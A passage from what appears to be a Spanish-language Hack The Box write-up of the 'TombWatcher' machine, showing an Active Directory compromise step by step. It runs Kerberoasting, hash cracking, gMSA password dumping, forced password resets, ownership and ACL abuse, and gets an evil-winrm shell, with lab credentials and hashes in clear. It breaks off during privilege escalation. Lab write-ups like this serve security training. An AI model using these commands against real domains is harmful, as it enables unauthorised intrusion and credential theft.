+</span></span><span class="line"><span class="cl">SMB 10.10.11.72 <span class="m">445</span> DC01 <span class="o">[</span>*<span class="o">]</span> Enumerated shares
+</span></span><span class="line"><span class="cl">SMB 10.10.11.72 <span class="m">445</span> DC01 Share Permissions Remark
+</span></span><span class="line"><span class="cl">SMB 10.10.11.72 <span class="m">445</span> DC01 ----- ----------- ------
+</span></span><span class="line"><span class="cl">SMB 10.10.11.72 <span class="m">445</span> DC01 ADMIN$ Remote Admin
+</span></span><span class="line"><span class="cl">SMB 10.10.11.72 <span class="m">445</span> DC01 C$ Default share
+</span></span><span class="line"><span class="cl">SMB 10.10.11.72 <span class="m">445</span> DC01 IPC$ READ Remote IPC
+</span></span><span class="line"><span class="cl">SMB 10.10.11.72 <span class="m">445</span> DC01 NETLOGON READ Logon server share
+</span></span><span class="line"><span class="cl">SMB 10.10.11.72 <span class="m">445</span> DC01 SYSVOL READ Logon server share
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb 10.10.11.72 -u <span class="s1">&#39;henry&#39;</span> -p <span class="s1">&#39;H3nry_987TGV!&#39;</span> --users
+</span></span><span class="line"><span class="cl">SMB 10.10.11.72 <span class="m">445</span> DC01 <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:tombwatcher.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.72 <span class="m">445</span> DC01 <span class="o">[</span>+<span class="o">]</span> tombwatcher.htb<span class="se">\h</span>enry:H3nry_987TGV!
+</span></span><span class="line"><span class="cl">SMB 10.10.11.72 <span class="m">445</span> DC01 -Username- -Last PW Set- -BadPW- -Description-
+</span></span><span class="line"><span class="cl">SMB 10.10.11.72 <span class="m">445</span> DC01 Administrator 2025-06-13 15:49:54 <span class="m">0</span> Built-in account <span class="k">for</span> administering the computer/domain
+</span></span><span class="line"><span class="cl">SMB 10.10.11.72 <span class="m">445</span> DC01 Guest &lt;never&gt; <span class="m">0</span> Built-in account <span class="k">for</span> guest access to the computer/domain
+</span></span><span class="line"><span class="cl">SMB 10.10.11.72 <span class="m">445</span> DC01 krbtgt 2024-11-16 00:02:28 <span class="m">0</span> Key Distribution Center Service Account
+</span></span><span class="line"><span class="cl">SMB 10.10.11.72 <span class="m">445</span> DC01 Henry 2025-05-12 15:17:03 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.72 <span class="m">445</span> DC01 Alfred 2025-05-12 15:17:03 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.72 <span class="m">445</span> DC01 sam 2025-06-13 17:54:51 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.72 <span class="m">445</span> DC01 john 2025-06-13 15:27:43 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.72 <span class="m">445</span> DC01 <span class="o">[</span>*<span class="o">]</span> Enumerated <span class="m">7</span> <span class="nb">local</span> users: TOMBWATCHER
+</span></span></code></pre></div><h1 id="kerberoast-attack---targetedkerberoast">Kerberoast attack - targetedKerberoast<a hidden class="anchor" aria-hidden="true" href="#kerberoast-attack---targetedkerberoast">#</a></h1>
+<p>Vemos que el usuario henry tiene permisos de <code>WriteSNP</code> sobre el usuario Alfred.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo ntpdate -s 10.10.11.72
+</span></span></code></pre></div><h2 id="sincronizar-hora-con-el-dc">Sincronizar hora con el DC<a hidden class="anchor" aria-hidden="true" href="#sincronizar-hora-con-el-dc">#</a></h2>
+<p>En un principio trato de sincronizarme con ntpdate -s ip pero sigue sin funcionar el ataque con el mismo error y tampoco me cambia la hora de mi reloj.</p>
+<pre tabindex="0"><code>❯ sudo ntpdate -u 10.10.11.72
+[sudo] contraseña para borhub:
+15 Jun 00:14:43 ntpdate[55439]: step time server 10.10.11.72 offset +14394.782456 sec
+</code></pre><p>Probando más opciones de ntpdate, doy con <code>-u</code> que también sincroniza el reloj.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo ntpdate -u 10.10.11.72
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> contraseña para borhub:
+</span></span><span class="line"><span class="cl"><span class="m">15</span> Jun 00:14:43 ntpdate<span class="o">[</span>55439<span class="o">]</span>: step <span class="nb">time</span> server 10.10.11.72 offset +14394.782456 sec
+</span></span></code></pre></div><p>También podemos usar la opción <code>-q</code> para sincronizar-nos con el servidor o para averiguar la zona horaria y luego manipular la hora de nuestra máquina atacante con el comando faketime.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo ntpdate -q 10.10.11.72
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> contraseña para borhub:
+</span></span><span class="line"><span class="cl">server 10.10.11.72, stratum 1, offset +0.002838, delay 0.06204
+</span></span><span class="line"><span class="cl"><span class="m">15</span> Jun 00:22:41 ntpdate<span class="o">[</span>57861<span class="o">]</span>: adjust <span class="nb">time</span> server 10.10.11.72 offset +0.002838 sec
+</span></span><span class="line"><span class="cl"><span class="c1">#Vemos que la hora del servidor es 00:22:41</span>
+</span></span></code></pre></div><p>Visto que me indica que me ha sincronizado la hora con el servidor, pruebo a lanzar otra vez el ataque kerberoast y esta vez si que conseguimos el hash.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ python3 targetedKerberoast.py --dc-ip 10.10.11.72 -d <span class="s1">&#39;TOMBWATCHER.htb&#39;</span> -u <span class="s1">&#39;henry&#39;</span> -p <span class="s1">&#39;H3nry_987TGV!&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting kerberoast attacks
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Fetching usernames from Active Directory with LDAP
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Printing <span class="nb">hash</span> <span class="k">for</span> <span class="o">(</span>Alfred<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$krb5tgs$23$*</span>Alfred<span class="nv">$TOMBWATCHER</span>.HTB<span class="nv">$TOMBWATCHER</span>.htb/Alfred*<span class="nv">$8</span>c2722939ffad8646047920d360dc4e8<span class="nv">$d9705fa389ed2e1e72d1a5a68a5c38e10eb6b6df153faed7496499e28260399051f12af457db390023b54ad38df3d55fb303a3ca0b8e154cfa9ba2ea03cd7eb83acbc4ea9c500853f1cb750337dfa7a3dd7ddc1e5dd42e668d928d8b2f56ffb9f8c2d76d003b4787459c69414bb9ed0e3a7cc192c857abf0392312c7897865e3037125bd1ef25cd72144a6e02480023103969b10dd123eb702a625d3286f673b43b75759480a067a6effd6095d0c28f4819eef64f5416f8373bc3aaf307cb74f652e93e6376ea317fadbf83cc700b8d788c6aa8064b19e1aaa73bfe0576418e5fefb24f4282e25c4d10d44c29a0037f04e7e1d6ba7b5689011795eb39145a4dc0f4b293c14540ff034070972a946744b3a42455de702974752aae3d7f8bbce67283ad564c05e9ffb538205da4b7e56b9c6dbd247f6ae9178a7c36e2b0f1ee1e35b20b6722901c9c36da6cd65a9e65dfbbcf97c9288bda88658d268d80416cede07a82e6c5c6c6ce533f5523a85bce31e9b27a252da445b7785de430ee17244852ad57f64ed2b2f6787458eb2c63dd743aa6c55431186727938f863626b4bd925692fe4d1e5cc013a65d8f8006f1a6cce0c4ae68e4fbae33bcb8d3511de5528dbfe26eed8d5ec1e485bb56468d0622525da393646d4d21e5974cb622e85ec2aca56916032d0a23eb77b1cba3fbaf5e4caf1f84273a478f26d1a1b2b6865452fc13c5e1cbc2dedfb2041221e2770a0c1825c4290543e1fa55710e8e99830b9cf4a498fe3d195c520b143e712086f88ce5b4d7e20dc03d518bd865f2bb44656f275a1c0b2fabec542ac8a85cc4629efc864b741a0ddfc9bcc67b1be75444b6cdf83a0f98458015820206632d72db0242421bd6c8b4f6abe87be96d2bc50de184bc1c78d76e8503d199c8aba6219b63a71ef1ea64b8c86e39084147dd07c2d4d9b1296976de27a50309aef34b0ac0eb178814dd21fa82e1c856a1c914c50b463a296b349ec00b720c868a2c3f72546300bbf39d9da5a900da22c6b17361995c327d9aa647ebe81e50fd4f5bef2bc28b61f5cd43c5fd5388684921024c0c823bfa4c3d950006015f07bd6607dd855cbac71e88bd9337cec6496d4747257bce98d4352cc9de581bc8d23127a7d79c0f2cfd8a91d023ea8fdb8dfd9ec9adebd1191f99dc4ece36efa23ed8a551bf43bcf7c9ae1fc98ab6f8f48addef2c5f1345923d0b6acf0cce21e35446a580f275b536f335bf956dea430d8eba203a79b9b207368c05b43bf910f2210d304fcc7a3bc38f085108c64e2ad37a3fce5335bdf822b42c1ca96700006a831610dba97c4b1b6f8de32e362bcd03fa63f54c687156f79277a33bcda871adc6e162fc99d75d65e613a005722260d7f3e3aca39529076375ab80f829609314098647ad93cb8421b3bede1e52b6022a26e0fadc8b23af89024e7d60a01c2b26c0f7496683d1ab579ab8bdb09320fd0</span>
+</span></span></code></pre></div><p>Obtenemos el hash y lo crackeamos haciendo uso de hashcat:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ hashcat -m <span class="m">13100</span> --force -a <span class="m">0</span> kerberohash /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt --force
+</span></span><span class="line"><span class="cl">hashcat <span class="o">(</span>v6.2.6<span class="o">)</span> starting
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">....SNIP....
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Dictionary cache hit:
+</span></span><span class="line"><span class="cl">* Filename..: /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt
+</span></span><span class="line"><span class="cl">* Passwords.: <span class="m">14344384</span>
+</span></span><span class="line"><span class="cl">* Bytes.....: <span class="m">139921497</span>
+</span></span><span class="line"><span class="cl">* Keyspace..: <span class="m">14344384</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$krb5tgs$23$*</span>Alfred<span class="nv">$TOMBWATCHER</span>.HTB<span class="nv">$TOMBWATCHER</span>.htb/Alfred*<span class="nv">$8</span>c2722939ffad8646047920d360dc4e8<span class="nv">$d9705fa389ed2e1e72d1a5a68a5c38e10eb6b6df153faed7496499e28260399051f12af457db390023b54ad38df3d55fb303a3ca0b8e154cfa9ba2ea03cd7eb83acbc4ea9c500853f1cb750337dfa7a3dd7ddc1e5dd42e668d928d8b2f56ffb9f8c2d76d003b4787459c69414bb9ed0e3a7cc192c857abf0392312c7897865e3037125bd1ef25cd72144a6e02480023103969b10dd123eb702a625d3286f673b43b75759480a067a6effd6095d0c28f4819eef64f5416f8373bc3aaf307cb74f652e93e6376ea317fadbf83cc700b8d788c6aa8064b19e1aaa73bfe0576418e5fefb24f4282e25c4d10d44c29a0037f04e7e1d6ba7b5689011795eb39145a4dc0f4b293c14540ff034070972a946744b3a42455de702974752aae3d7f8bbce67283ad564c05e9ffb538205da4b7e56b9c6dbd247f6ae9178a7c36e2b0f1ee1e35b20b6722901c9c36da6cd65a9e65dfbbcf97c9288bda88658d268d80416cede07a82e6c5c6c6ce533f5523a85bce31e9b27a252da445b7785de430ee17244852ad57f64ed2b2f6787458eb2c63dd743aa6c55431186727938f863626b4bd925692fe4d1e5cc013a65d8f8006f1a6cce0c4ae68e4fbae33bcb8d3511de5528dbfe26eed8d5ec1e485bb56468d0622525da393646d4d21e5974cb622e85ec2aca56916032d0a23eb77b1cba3fbaf5e4caf1f84273a478f26d1a1b2b6865452fc13c5e1cbc2dedfb2041221e2770a0c1825c4290543e1fa55710e8e99830b9cf4a498fe3d195c520b143e712086f88ce5b4d7e20dc03d518bd865f2bb44656f275a1c0b2fabec542ac8a85cc4629efc864b741a0ddfc9bcc67b1be75444b6cdf83a0f98458015820206632d72db0242421bd6c8b4f6abe87be96d2bc50de184bc1c78d76e8503d199c8aba6219b63a71ef1ea64b8c86e39084147dd07c2d4d9b1296976de27a50309aef34b0ac0eb178814dd21fa82e1c856a1c914c50b463a296b349ec00b720c868a2c3f72546300bbf39d9da5a900da22c6b17361995c327d9aa647ebe81e50fd4f5bef2bc28b61f5cd43c5fd5388684921024c0c823bfa4c3d950006015f07bd6607dd855cbac71e88bd9337cec6496d4747257bce98d4352cc9de581bc8d23127a7d79c0f2cfd8a91d023ea8fdb8dfd9ec9adebd1191f99dc4ece36efa23ed8a551bf43bcf7c9ae1fc98ab6f8f48addef2c5f1345923d0b6acf0cce21e35446a580f275b536f335bf956dea430d8eba203a79b9b207368c05b43bf910f2210d304fcc7a3bc38f085108c64e2ad37a3fce5335bdf822b42c1ca96700006a831610dba97c4b1b6f8de32e362bcd03fa63f54c687156f79277a33bcda871adc6e162fc99d75d65e613a005722260d7f3e3aca39529076375ab80f829609314098647ad93cb8421b3bede1e52b6022a26e0fadc8b23af89024e7d60a01c2b26c0f7496683d1ab579ab8bdb09320fd0</span>:basketball
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Session..........: hashcat
+</span></span><span class="line"><span class="cl">Status...........: Cracked
+</span></span><span class="line"><span class="cl">Hash.Mode........: <span class="m">13100</span> <span class="o">(</span>Kerberos 5, etype 23, TGS-REP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Hash.Target......: <span class="nv">$krb5tgs$23$*</span>Alfred<span class="nv">$TOMBWATCHER</span>.HTB<span class="nv">$TOMBWATCHER</span>.htb...320fd0
+</span></span><span class="line"><span class="cl">Time.Started.....: Sun Jun <span class="m">15</span> 00:33:44 2025, <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Time.Estimated...: Sun Jun <span class="m">15</span> 00:33:44 2025, <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Kernel.Feature...: Pure Kernel
+</span></span><span class="line"><span class="cl">Guess.Base.......: File <span class="o">(</span>/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Speed.#1.........: 16003.1 kH/s <span class="o">(</span>6.26ms<span class="o">)</span> @ Accel:1024 Loops:1 Thr:32 Vec:1
+</span></span><span class="line"><span class="cl">Recovered........: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>total<span class="o">)</span>, 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>new<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Progress.........: 196608/14344384 <span class="o">(</span>1.37%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Rejected.........: 0/196608 <span class="o">(</span>0.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Restore.Point....: 0/14344384 <span class="o">(</span>0.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+</span></span><span class="line"><span class="cl">Candidate.Engine.: Device Generator
+</span></span><span class="line"><span class="cl">Candidates.#1....: <span class="m">123456</span> -&gt; piggy!
+</span></span><span class="line"><span class="cl">Hardware.Mon.#1..: Temp: 55c Util:  0% Core: 533MHz Mem:2400MHz Bus:16
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Started: Sun Jun <span class="m">15</span> 00:33:33 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">Stopped: Sun Jun <span class="m">15</span> 00:33:45 <span class="m">2025</span>
+</span></span></code></pre></div><p>Y usamos ncx para comprobar que las credenciales son validas:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb 10.10.11.72 -u <span class="s1">&#39;Alfred&#39;</span> -p <span class="s1">&#39;basketball&#39;</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.72     <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:tombwatcher.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.72     <span class="m">445</span>    DC01             <span class="o">[</span>+<span class="o">]</span> tombwatcher.htb<span class="se">\A</span>lfred:basketball
+</span></span></code></pre></div><h1 id="enumeración-con-bloodhound">Enumeración con Bloodhound<a hidden class="anchor" aria-hidden="true" href="#enumeración-con-bloodhound">#</a></h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ bloodhound-python -u Alfred -p <span class="s1">&#39;basketball&#39;</span> -d TOMBWATCHER.HTB -ns 10.10.11.72 -c all --zip
+</span></span><span class="line"><span class="cl">INFO: BloodHound.py <span class="k">for</span> BloodHound LEGACY <span class="o">(</span>BloodHound 4.2 and 4.3<span class="o">)</span>
+</span></span><span class="line"><span class="cl">INFO: Found AD domain: tombwatcher.htb
+</span></span><span class="line"><span class="cl">INFO: Getting TGT <span class="k">for</span> user
+</span></span><span class="line"><span class="cl">WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: <span class="o">[</span>Errno Connection error <span class="o">(</span>dc01.tombwatcher.htb:88<span class="o">)]</span> <span class="o">[</span>Errno -2<span class="o">]</span> Name or service not known
+</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: dc01.tombwatcher.htb
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains in the forest
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> computers
+</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: dc01.tombwatcher.htb
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">9</span> users
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">53</span> groups
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">2</span> gpos
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">2</span> ous
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">19</span> containers
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">0</span> trusts
+</span></span><span class="line"><span class="cl">INFO: Starting computer enumeration with <span class="m">10</span> workers
+</span></span><span class="line"><span class="cl">INFO: Querying computer: DC01.tombwatcher.htb
+</span></span><span class="line"><span class="cl">INFO: Done in 00M 11S
+</span></span><span class="line"><span class="cl">INFO: Compressing output into 20250615003825_bloodhound.zip
+</span></span></code></pre></div><h2 id="abusando-de-permisos-addself---bloodyad">Abusando de permisos AddSelf - BloodyAD<a hidden class="anchor" aria-hidden="true" href="#abusando-de-permisos-addself---bloodyad">#</a></h2>
+<p>Vemos que el usuario Alfred tiene permisos AddSelf, es decir, tiene la habilidad de añadirse al grupo INFRASTRUCTURE heredando sus permisos.</p>
+<p><img alt="tombwatcher_machine 1" loading="lazy" src="/img/tombwatcher/tombwatcher_machine_1.png"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ bloodyAD --host 10.10.11.72 -d <span class="s1">&#39;TOMBWATCHER.HTB&#39;</span> -u <span class="s1">&#39;Alfred&#39;</span> -p <span class="s1">&#39;basketball&#39;</span> add groupMember <span class="s1">&#39;INFRASTRUCTURE&#39;</span> <span class="s1">&#39;Alfred&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Alfred added to INFRASTRUCTURE
+</span></span></code></pre></div><p>Una vez con el usuario añadido al grupo seguimos viendo que permisos tiene el grupo Infrastructure.</p>
+<p><img alt="tombwatcher_machine 2" loading="lazy" src="/img/tombwatcher/tombwatcher_machine_2.png"></p>
+<h2 id="abusando-de-permisos-readgmsapassword---gmsadumper">Abusando de permisos ReadGMSAPassword - gMSADumper<a hidden class="anchor" aria-hidden="true" href="#abusando-de-permisos-readgmsapassword---gmsadumper">#</a></h2>
+<p>El grupo infrastructure tiene permisos <code>ReadGMSAPassword</code> sobre ANSIBLE_DEV$ que es un <code>GroupManaged Service Account</code>. Este permiso nos puede permitir obtener contraseñas de ANSIBLE_DEV$.</p>
+<p>Usando la herramienta gMSADumper.py podemos sustraer el hash:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ python3 gMSADumper.py -u <span class="s1">&#39;Alfred&#39;</span> -p <span class="s1">&#39;basketball&#39;</span> -l 10.10.11.72 -d <span class="s1">&#39;tombwatcher.htb&#39;</span>
+</span></span><span class="line"><span class="cl">Users or groups who can <span class="nb">read</span> password <span class="k">for</span> ansible_dev$:
+</span></span><span class="line"><span class="cl"> &gt; Infrastructure
+</span></span><span class="line"><span class="cl">ansible_dev$:::4b21348ca4a9edff9689cdf75cbda439
+</span></span><span class="line"><span class="cl">ansible_dev$:aes256-cts-hmac-sha1-96:499620251908efbd6972fd63ba7e385eb4ea2f0ea5127f0ab4ae3fd7811e600a
+</span></span><span class="line"><span class="cl">ansible_dev$:aes128-cts-hmac-sha1-96:230ccd9df374b5fad6a322c5d7410226
+</span></span></code></pre></div><h2 id="abusando-de-permisos-forcechangepassword---net-rpc">Abusando de permisos ForceChangePassword - Net rpc<a hidden class="anchor" aria-hidden="true" href="#abusando-de-permisos-forcechangepassword---net-rpc">#</a></h2>
+<p>Vemos el hash de ansible_dev$ y si miramos los permisos de la computadora ANSIBLE_DEV$ vemos que tiene permisos ForceChangePassword sobre SAM</p>
+<p><img alt="tombwatcher_machine 3" loading="lazy" src="/img/tombwatcher/tombwatcher_machine_3.png"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ net rpc password <span class="s2">&#34;SAM&#34;</span> <span class="s1">&#39;Micontrafavorita123!&#39;</span> -U TOMBWATCHER.HTB/ANSIBLE_DEV$%<span class="s1">&#39;4b21348ca4a9edff9689cdf75cbda439&#39;</span> --pw-nt-hash -S <span class="s2">&#34;10.10.11.72&#34;</span>
+</span></span></code></pre></div><h2 id="abusando-de-permisos-writeowner---bloodyad">Abusando de permisos WriteOwner - BloodyAD<a hidden class="anchor" aria-hidden="true" href="#abusando-de-permisos-writeowner---bloodyad">#</a></h2>
+<p>Una vez sabiendo la contraseña de SAM vemos que SAM tiene permisos <code>WriteOwner</code> sobre el usuario Jhon.</p>
+<p><img alt="tombwatcher_machine 4" loading="lazy" src="/img/tombwatcher/tombwatcher_machine_4.png"></p>
+<p>Con lo cual vamos a convertir a SAM en propietario del usuario JOHN con bloodyAD.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ bloodyAD --host 10.10.11.72 -d TOMBWATCHER.htb -u <span class="s1">&#39;SAM&#39;</span> -p <span class="s1">&#39;Micontrafavorita123!&#39;</span> <span class="nb">set</span> owner <span class="s1">&#39;JOHN&#39;</span> <span class="s1">&#39;SAM&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by SAM on JOHN
+</span></span></code></pre></div><p>Y ahora nos damos permisos totales (GenericAll) sobre JOHN.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">​❯ bloodyAD --host 10.10.11.72 -d TOMBWATCHER.htb -u <span class="s1">&#39;SAM&#39;</span> -p <span class="s1">&#39;Micontrafavorita123!&#39;</span> add genericAll <span class="s1">&#39;JOHN&#39;</span> <span class="s1">&#39;SAM&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> SAM has now GenericAll on JOHN
+</span></span></code></pre></div><p>Y ahora nos damos permisos totales (GenericAll) sobre JOHN.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ bloodyAD --host 10.10.11.72 -d TOMBWATCHER.htb -u <span class="s1">&#39;SAM&#39;</span> -p <span class="s1">&#39;Micontrafavorita123!&#39;</span> add genericAll <span class="s1">&#39;JOHN&#39;</span> <span class="s1">&#39;SAM&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> SAM has now GenericAll on JOHN
+</span></span></code></pre></div><p>Ahora con Net rpc cambiamos la contraseña de JOHN y comprobamos con nxc que haya funcionado correctamente.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ net rpc password <span class="s2">&#34;JOHN&#34;</span> <span class="s1">&#39;Micontrafavorita123!&#39;</span> -U TOMBWATCHER.HTB/SAM%<span class="s1">&#39;Micontrafavorita123!&#39;</span> -S <span class="s2">&#34;10.10.11.72&#34;</span>
+</span></span><span class="line"><span class="cl">❯ nxc smb 10.10.11.72 -u <span class="s1">&#39;JOHN&#39;</span> -p <span class="s1">&#39;Micontrafavorita123!&#39;</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.72     <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:tombwatcher.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.72     <span class="m">445</span>    DC01             <span class="o">[</span>+<span class="o">]</span> tombwatcher.htb<span class="se">\J</span>OHN:Micontrafavorita123!
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ evil-winrm -i 10.10.11.72 -u JOHN -p <span class="s1">&#39;Micontrafavorita123!&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.7
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="s1">&#39;quoting_detection_proc&#39;</span> <span class="k">for</span> module Reline
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\j</span>ohn<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ../Desktop/user.txt
+</span></span><span class="line"><span class="cl">559f53b2bf839cc2c6d10beece095160
+</span></span></code></pre></div><h1 id="escalada-de-privilegios">Escalada de privilegios<a hidden class="anchor" aria-hidden="true" href="#escalada-de-privilegios">#</a></h1>
+<h2 id="abusando-de-permisos-genericall-sobre-organizational-units-acl">Abusando de permisos GenericAll sobre Organizational Units ACL<a hidden class="anchor" aria-hidden="true" href="#abusando-de-permisos-genericall-sobre-organizational-units-acl">#</a></h2>
+<p><img alt="tombwatcher_machine 5" loading="lazy" src="/img/tombwatcher/tombwatcher_machine_5.png"></p>
+<p>Si miramos la enumeración en el bloodhound vemos que el usuario JHON tiene permisos <code>GenericAll</code> sobre la Unidad Organizativa (OU) ADCS. Este tipo de permisos puede ser utilizado para añadir una ACE con FullControl y herencia activada, comprometiendo todos los objetos hijos.</p>
+<blockquote>
+<p>Una ACE (Access Control Entry) es un elemento individual en una lista de control de acceso (ACL) que define los permisos para un usuario, grupo u objeto específico.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ dacledit.py -action <span class="s1">&#39;write&#39;</span> -rights <span class="s1">&#39;FullControl&#39;</span> -inheritance -principal <span class="s1">&#39;JOHN&#39;</span> -target-dn <span class="s1">&#39;ou=ADCS,dc=TOMBWATCHER,dc=htb&#39;</span> <span class="s1">&#39;tombwatcher.htb&#39;</span>/<span class="s1">&#39;JOHN&#39;</span>:<span class="s1">&#39;Micontrafavorita123!&#39;</span> -dc-ip 10.10.11.72 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NB: objects with <span class="nv">adminCount</span><span class="o">=</span><span class="m">1</span> will no inherit ACEs from their parent container/OU
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> DACL backed up to dacledit-20250615-040613.bak
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> DACL modified successfully!
